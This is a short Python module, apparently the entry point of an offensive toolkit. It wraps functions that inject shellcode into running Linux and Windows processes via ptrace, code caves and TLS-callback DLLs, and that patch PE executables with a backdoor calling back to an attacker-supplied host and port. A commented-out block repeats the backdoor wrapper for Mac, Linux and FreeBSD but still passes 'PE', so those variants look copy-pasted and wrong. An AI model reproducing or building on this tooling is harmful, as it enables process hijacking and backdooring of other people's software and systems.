def linux86ptrace( pid, shellcode):
    from .Linux86.inject import injectmex86
    injectmex86( pid, shellcode)

def linux64ptrace( pid, shellcode):
    from .Linux64.inject import injectmex64
    injectmex64( pid, shellcode)


def winx86Codecave( exe, shellcode):
    from .Windowsx86.codecaveinjector import main
    main( exe, shellcode)


def winx86tLsDLL( exe, dll):
    from .Windowsx86.tlsInjector import main
    main( exe, dll)

def winDLL( pid, shellcode):
    from .Windows.inject import qweqwe
    qweqwe( pid, shellcode)


def winBFD( FILE, HOST, PORT):
    from .BFDBackdoors.backdoor import start
    start("PE", FILE, HOST, PORT).patch()


"""
def MacBFD( FILE, HOST, PORT):
	from .BFDBackdoors.backdoor import start
	start("PE", FILE, HOST, PORT).patch()


def LinuxBFD( FILE, HOST, PORT):
	from .BFDBackdoors.backdoor import start
	start("PE", FILE, HOST, PORT).patch()


def LinuxARMx86BFD( FILE, HOST, PORT):
	from .BFDBackdoors.backdoor import start
	start("PE", FILE, HOST, PORT).patch()


def FreeBSDx86( FILE, HOST, PORT):
	from .BFDBackdoors.backdoor import start
	start("PE", FILE, HOST, PORT).patch()
"""





